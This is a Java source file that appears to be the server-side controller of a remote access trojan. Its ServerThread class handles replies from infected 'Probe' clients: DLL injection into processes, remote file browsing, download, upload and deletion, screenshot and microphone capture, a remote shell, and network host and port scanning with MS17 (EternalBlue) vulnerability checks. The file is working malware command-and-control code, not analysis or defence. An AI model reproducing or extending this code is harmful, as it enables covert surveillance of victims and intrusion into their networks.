package rhp;

import java.awt.image.BufferedImage;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JLabel;
import javax.swing.JOptionPane;


class ServerThread extends Thread {
	public static boolean run = true;
	private Socket sock;
	static ArrayList<String> LOG = new ArrayList<String>();
    public ServerThread(Socket clientsocket) {
    	this.sock = clientsocket;
	}
    
    public void clear()
    {
    	int mainIndex = Server.Clients.indexOf(sock);
    	try {
    		Server.Clients.remove(mainIndex);
    		Server.WANIP.remove(mainIndex);
    		Server.OperatingSystem.remove(mainIndex);
    		Server.UserPC.remove(mainIndex);
    		MainWindow.model.removeRow(mainIndex);
    		MainWindow.UpdateOnlineLabel();
    		MainWindow.Log("Client ID : " + String.valueOf(mainIndex) + " disconnected.");
    	} catch(Exception e) {
    		e.printStackTrace();
    	}
    }
    
    public static void WaitForReplyMeta() // bruh
    {
    	LOG.clear();

    	int x = 0;
    	while(x != 20) {
    		try {
    			if(LOG.size() > 0) {
    				break;
    			} 
    			
    			TimeUnit.MILLISECONDS.sleep(500);
    			x+=1;
    			
    		} catch (Exception ef) {
    			ef.printStackTrace();
    		}
    	}
    }
    
    
    public static String SelectedFile()
    {
    	return FileManager.SelectedFile.toString().strip();
    }
    public static void WaitForReply()
    {
    	LOG.clear();

    	int x = 0;
    	while(x != 20) {
    		try {
    			if(LOG.size() > 0) {
    				break;
    			} 
    			
    			TimeUnit.MILLISECONDS.sleep(5);
    			x+=1;
    			
    		} catch (Exception ef) {
    			ef.printStackTrace();
    		}
    	}
    }
    @Override
	public void run() {
		while(run) {
			try {
				TimeUnit.SECONDS.sleep(1);
			} catch (InterruptedException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
			InputStream is;
			try {
				is = sock.getInputStream();
			} catch (IOException e) {
				clear();
				e.printStackTrace();
				break;
			} catch (NullPointerException ne) {
				clear();
				ne.printStackTrace();
				break;
			}
			int read;
		    try {
		    	LOG.clear();
		    	Arrays.fill(Server.buffer, (byte)0);
				read = is.read(Server.buffer);
				String response = new String(Server.buffer, 0, read);
				LOG.add(response);
				
				
				
				//Shell s = new Shell();
				if(Shell.ShellOutput.isVisible())
				{
					Shell.ShellOutput.append("\n" + response);
				} 
				

				if(FileManager.contentPanel.isVisible())
				{
					if(response.startsWith("RHPDIR<>")) {
						FileManager.model.removeAllElements();
						FileManager.model.clear();
						String[] files = response.split("\n");
						String file;
						for (int i = 0; i < files.length; i++) { 
				            file = files[i];
				            if(file.startsWith("RHPDIR<>")) {
				            	FileManager.textField.setText(file.replace("RHPDIR<>", ""));
				            } else if(file.startsWith("^")) {
				            	FileManager.model.addElement(file.replace("^", "(^)")); // A directory
				            } else {
				            	FileManager.model.addElement(file);
				            }
						}
					} 
				}
				
				if(response.startsWith("DLL_OK"))
				{
					try {
						String[] parse = response.split(":");
	  					JOptionPane.showMessageDialog(null, "Injected DLL in Process ID " + parse[1] + " on Client ID " + String.valueOf(Server.Clients.indexOf(sock)));
	  					MainWindow.Log("Injected DLL in Process ID " + parse[1] + " on Client ID " + String.valueOf(Server.Clients.indexOf(sock)));
					} catch (Exception spe)
					{
						spe.printStackTrace();
					}
					
				} else if (response.startsWith("DEL_OK")) {
					try {
						String[] parse = response.split(",");
						int mainIndex = Server.Clients.indexOf(sock);
						if(parse[1].equals(SelectedFile())) {
							JOptionPane.showMessageDialog(null, "File '"+parse[1] + "' deleted from '"+parse[2]+"'.", Server.UserPC.get(mainIndex) + " says : ", JOptionPane.INFORMATION_MESSAGE);
							MainWindow.Log( "File '"+parse[1] + "' deleted from '"+parse[2]+"'.");
						} else {
							Server.SendData(sock, "kill");
							sock.close();
							clear();
							MainWindow.Log("Connection Closed for Client ID : " + Server.Clients.indexOf(sock));
						}
						
					} catch (Exception e) {
						e.printStackTrace();
					}
					
					
				} 
				
				else if(response.startsWith("FILE")) {
					String fileinfo[] = response.split(":");
					String filename = fileinfo[1].strip();
					String filesizeStr = fileinfo[2].strip();

					if(filename.equals(SelectedFile())) {
						
						int fsize = Integer.parseInt(filesizeStr);
						JOptionPane.showMessageDialog(null, "File '" + filename + "' of size '" + filesizeStr + "' bytes will be Downloaded.");
						MainWindow.Log( "File '" + filename + "' of size '" + filesizeStr + "' bytes will be Downloaded.");
						File downloaded_file = new File("downloads/" + filename);
						downloaded_file.createNewFile();
						FileOutputStream fos = new FileOutputStream(downloaded_file, false);
						BufferedOutputStream out = new BufferedOutputStream(fos);
						
						FileManager.DisableFileManager();
						byte[] filebuf = new byte[fsize];
						Arrays.fill(filebuf, (byte)0);
						do {
							read= is.readNBytes(filebuf, 0, fsize);
							fos.write(filebuf, 0, read);
							if(read == Integer.parseInt(filesizeStr)) {
								break;
							}
							//System.out.println(read);
						} while (read != 0);
						
						FileManager.EnableFileManager();
						fos.close();
						JOptionPane.showMessageDialog(null, "File " + filename + " downloaded.\nBytes Expected : " + filesizeStr + " Bytes.\n"
								+ "Bytes Recevied : " + String.valueOf( new File("downloads/"+filename).length()) + " Bytes.");
						MainWindow.Log("File " + filename + " downloaded.");
						
						out.flush();
					} else {
						// The file being downloaded is not the same as the file selected
						int mainIndex = Server.Clients.indexOf(sock);
						String info = Server.UserPC.get(mainIndex);
						MainWindow.Log("Connection Closed for Client ID : " + Server.Clients.indexOf(sock));
						Server.SendData(sock, "kill");
						sock.close();
						clear();
						
						JOptionPane.showMessageDialog(null, "Client ID : " + String.valueOf(mainIndex) + " " +  info + " was kicked because it attempted to upload a file we did not Download. There may be a third party Impersonating as the Probe.");
						
						
						
					}
				}
				
				else if (response.startsWith("F_OK")) {
					String fileokinfo[] = response.split(",");
					int mainIndex = Server.Clients.indexOf(sock);
					JOptionPane.showMessageDialog(null, 
							
							"Uploaded : " + fileokinfo[1] +
							"\nBytes Sent : " + fileokinfo[2] + " bytes."+
							"\nUploaded to : " + fileokinfo[3]
									, Server.UserPC.get(mainIndex) + " : ", JOptionPane.INFORMATION_MESSAGE);
				}
				
				else if(response.startsWith("PROCESS"))
				{
					try {
						String parse[] = response.split(",");
	
						int mainIndex = Server.Clients.indexOf(sock);
						JOptionPane.showMessageDialog(null, "Process Name : " + parse[1] + "\nProcess PID : " + parse[2] + "\nProcess Path : " + parse[3], Server.UserPC.get(mainIndex) + " says : ", JOptionPane.INFORMATION_MESSAGE);
					} catch (Exception es)
					{
						es.printStackTrace();
					}
				}
				
				else if(response.startsWith("drive"))
				{
					FileManager.driveslist.clear();
					String[ ] parse = response.split(",");
					for (String x : parse) {
						FileManager.driveslist.add(x.replace("drive:", ""));
					}
				}
				
				else if(response.startsWith("[HOST]"))
				{
					try {
						//System.out.println("Got the damn response!");
						if(NetworkScanner.NetworkScanRunning)
						{
							String parse[] = response.split(",");
							String IpAddr = parse[1];
							String hostname = parse[2];
							String Macaddr = parse[3];
							
							NetworkScanner.NsModel.addElement("Discovered host : " + IpAddr + " - " + hostname + " - " + Macaddr );
						} else {
							// The scan is not running, Why is the client sending us this information?
							Server.SendData(sock, "kill");
							sock.close();
							clear();
							MainWindow.Log("Connection Closed for Client ID : " + Server.Clients.indexOf(sock));
							int mainIndex = Server.Clients.indexOf(sock);
							String info = Server.UserPC.get(mainIndex);
							JOptionPane.showMessageDialog(null, "Client ID : " + String.valueOf(mainIndex) + " " +  info + " was kicked because it sent an unexpected command. There may be a third party Impersonating as the Probe.");
						}
						
					} catch (Exception ls)
					{
						ls.printStackTrace(); // TODO : what the fuck am I naming the exception.
					}
				}
				
				else if (response.startsWith("[HOSTERR]")) {
					try {
						if(NetworkScanner.NetworkScanRunning)
						{
							//System.out.println("Got the damn ERROR response!");
							String parse[] = response.split("-");
							NetworkScanner.NsModel.addElement( parse[1]);
						} else {
							// The scan is not running, Why is the client sending us this information?
							Server.SendData(sock, "kill");
							sock.close();
							clear();
							MainWindow.Log("Connection Closed for Client ID : " + Server.Clients.indexOf(sock));
						}
						
					} catch (Exception ls)
					{
						ls.printStackTrace(); // TODO : what the fuck am I naming the exception.
					}
				}
				
				else if(response.startsWith("OPENPORT"))
				{
					try {
						if(NetworkScanner.NetworkScanRunning)
						{
							String parse[] = response.split(":")[1].split(",");
						
							NetworkScanner.PModel.addElement( "Port is open " + parse[1] + " (" + NetworkScanner.PortService(parse[1]) + ") on " + parse[0]);
						} else {
							// The scan is not running, Why is the client sending us this information?
							Server.SendData(sock, "kill");
							sock.close();
							clear();
							MainWindow.Log("Connection Closed for Client ID : " + Server.Clients.indexOf(sock));
						}
						
					} catch (Exception ls)
					{
						ls.printStackTrace(); // TODO : what the fuck am I naming the exception.
					}
				}
				
				else if(response.startsWith("!MS17!")){
					try {
						if(NetworkScanner.NetworkScanRunning)
						{
							String[] infoString = response.split("!MS17!");
							
							for (String info : infoString) {
								NetworkScanner.EModel.addElement(info);
							}
						} else {
							// The scan is not running, Why is the client sending us this information?
							Server.SendData(sock, "kill");
							sock.close();
							clear();
							MainWindow.Log("Connection Closed for Client ID : " + Server.Clients.indexOf(sock));
						}
						
						
					} catch (Exception ls)
					{
						ls.printStackTrace(); // TODO : what the fuck am I naming the exception.
					}
				}
				
				else if(response.startsWith("DIRERROR"))
				{
					try {
						if(FileManager.FileMgrOpen)
						{
							String infoString = response.replace("DIRERROR", "");
							
							int mainIndex = Server.Clients.indexOf(sock);
							JOptionPane.showMessageDialog(null, infoString, Server.UserPC.get(mainIndex) + " says : ", JOptionPane.INFORMATION_MESSAGE);
							MainWindow.Log(Server.UserPC.get(mainIndex) + " says : " + infoString);
						} else {
							// File manager isn't open
							Server.SendData(sock, "kill");
							sock.close();
							clear();
							MainWindow.Log("Connection Closed for Client ID : " + Server.Clients.indexOf(sock));
						}
						
						
					} catch (Exception ls)
					{
						ls.printStackTrace(); // TODO : what the fuck am I naming the exception.
					}
				}
				
				else if(response.startsWith("F_ERR"))
				{
					try {
						String infoString = response.replace("F_ERR", "");
						int mainIndex = Server.Clients.indexOf(sock);
						JOptionPane.showMessageDialog(null, infoString, Server.UserPC.get(mainIndex) + " says : ", JOptionPane.INFORMATION_MESSAGE);
						MainWindow.Log(Server.UserPC.get(mainIndex) + " says : " + infoString);
						
					} catch (Exception ls)
					{
						ls.printStackTrace(); // TODO : what the fuck am I naming the exception.
					}
				}
				else if(response.startsWith("!hs!")){
					try {
						if(NetworkScanner.NetworkScanRunning)
						{
							String infoString = response.replace("!hs!", "");
							
							NetworkScanner.HModel.addElement(infoString);
						} else {
							// The scan is not running, Why is the client sending us this information?
							Server.SendData(sock, "kill");
							sock.close();
							clear();
							MainWindow.Log("Connection Closed for Client ID : " + Server.Clients.indexOf(sock));
						}
						
						
					} catch (Exception ls)
					{
						ls.printStackTrace(); // TODO : what the fuck am I naming the exception.
					}
				}
				
				else if(response.startsWith("SCREENSHOT")) {
					String fileinfo[] = response.split(":");
					String filename = fileinfo[1].strip();
					String filesizeStr = fileinfo[2].strip();
					int fsize = Integer.parseInt(filesizeStr);
					if(filename.contains(".bmp")) {
					//JOptionPane.showMessageDialog(null, "File '" + filename + "' of size '" + filesizeStr + "' bytes will be Downloaded.");
						MainWindow.Log( "Screenshot '" + filename + "' of size '" + filesizeStr + "' bytes will be Downloaded.");
						File downloaded_file = new File(filename);
						downloaded_file.createNewFile();
						FileOutputStream fos = new FileOutputStream(downloaded_file, false);
						BufferedOutputStream out = new BufferedOutputStream(fos);
						
						MainWindow.HaltAllSystems();
						byte[] filebuf = new byte[fsize];
						Arrays.fill(filebuf, (byte)0);
						do {
							read= is.readNBytes(filebuf, 0, fsize);
							fos.write(filebuf, 0, read);
							if(read == Integer.parseInt(filesizeStr)) {
								break;
							}
							//System.out.println(read);
						} while (read != 0);
						
						fos.close();
						// Convert bmp to png
						String newfile = filename.replace(".bmp", ".png");
						BufferedImage bmpimg = ImageIO.read(downloaded_file);
						File outputfile = new File("screenshots/"+newfile); // 
					    ImageIO.write(bmpimg, "png", outputfile);
					    // Delete original
					    try {
					    	Path delete = new File(filename).toPath(); Files.deleteIfExists(delete);
					    } catch (Exception eS)
					    {
					    	eS.printStackTrace();
					    }
					    
					    
					    // Display Image				    
					    ImageViewer.ImagePath = "screenshots/" + newfile;
					    ImageViewer iv = new ImageViewer(); iv.setVisible(true);
					    
						MainWindow.EnableAllSystems();
						
						//JOptionPane.showMessageDialog(null, "File " + filename + " downloaded.\nBytes Expected : " + filesizeStr + " Bytes.\n"
						//		+ "Bytes Recevied : " + String.valueOf( new File(filename).length()) + " Bytes.");
						MainWindow.Log("Screenshot " + filename + " downloaded.");
						
						out.flush();
					} else {

						Server.SendData(sock, "kill");
						sock.close();
						clear();
						MainWindow.Log("Connection Closed for Client ID : " + Server.Clients.indexOf(sock));
						int mainIndex = Server.Clients.indexOf(sock);
						String info = Server.UserPC.get(mainIndex);
						JOptionPane.showMessageDialog(null, "Client ID : " + String.valueOf(mainIndex) + " " +  info + " was kicked because it attempted to upload a file we did not Download. There may be a third party Impersonating as the Probe.");
					}
				} 
				
				else if(response.startsWith("MIC_OK"))
				{
					if(MicRecorder.MicRec)
					{
						String Message = response.replace("MIC_OK:","");
						MainWindow.Log("Client ID " + String.valueOf(Server.Clients.indexOf(sock)) + " says : " + Message);
						MicRecorder.AnimateGui();
					} else {
						Server.SendData(sock, "kill");
						sock.close();
						clear();
						MainWindow.Log("Connection Closed for Client ID : " + Server.Clients.indexOf(sock));
						int mainIndex = Server.Clients.indexOf(sock);
						String info = Server.UserPC.get(mainIndex);
						JOptionPane.showMessageDialog(null, "Client ID : " + String.valueOf(mainIndex) + " " +  info + " was kicked because it attempted to upload a file we did not Download. There may be a third party Impersonating as the Probe.");
					}
					
				}
				
				else if(response.startsWith("MIC")) {
					if(MicRecorder.MicRec)
					{
						String fileinfo[] = response.split(":");
						String filename = fileinfo[1].strip();
						String filesizeStr = fileinfo[2].strip();
						int fsize = Integer.parseInt(filesizeStr);
						if(filename.contains(".wav"))
						{
							MainWindow.Log( "Mic Recording '" + filename + "' of size '" + filesizeStr + "' bytes will be Downloaded.");
							File downloaded_file = new File("downloads/"+filename);
							downloaded_file.createNewFile();
							FileOutputStream fos = new FileOutputStream(downloaded_file, false);
							BufferedOutputStream out = new BufferedOutputStream(fos);
							
							MainWindow.HaltAllSystems();
							byte[] filebuf = new byte[fsize];
							Arrays.fill(filebuf, (byte)0);
							do {
								read= is.readNBytes(filebuf, 0, fsize);
								fos.write(filebuf, 0, read);
								if(read == Integer.parseInt(filesizeStr)) {
									break;
								}
								//System.out.println(read);
							} while (read != 0);
							
							MainWindow.EnableAllSystems();
							fos.close();
							JOptionPane.showMessageDialog(null, "Mic Recording " + filename + " downloaded.\nBytes Expected : " + filesizeStr + " Bytes.\n"
									+ "Bytes Recevied : " + String.valueOf( new File("downloads/"+filename).length()) + " Bytes.");
							MainWindow.Log("File " + filename + " downloaded.");
							
							out.flush();
						} else {
							Server.SendData(sock, "kill");
							sock.close();
							clear();
							MainWindow.Log("Connection Closed for Client ID : " + Server.Clients.indexOf(sock));
							int mainIndex = Server.Clients.indexOf(sock);
							String info = Server.UserPC.get(mainIndex);
							JOptionPane.showMessageDialog(null, "Client ID : " + String.valueOf(mainIndex) + " " +  info + " was kicked because it attempted to upload a file we did not Download. There may be a third party Impersonating as the Probe.");
						}
					}
					
				}
				
			
				else {
					if(!Shell.ShellOutput.isVisible()) {
						MainWindow.Log("Client ID " + String.valueOf(Server.Clients.indexOf(sock)) + " sent : " + response + " (" + String.valueOf(response.length()) + " bytes)");
					}
				}
				
			} catch (IOException e) {
				clear();
				e.printStackTrace();
				break;
			} catch (NullPointerException ne) {
				clear();
				ne.printStackTrace();
				break;
			} catch(java.lang.StringIndexOutOfBoundsException strE) {
				clear(); strE.printStackTrace(); break;
			} catch(java.lang.ArrayIndexOutOfBoundsException arraE) {
				clear(); arraE.printStackTrace(); break;
			}
		}
	}
}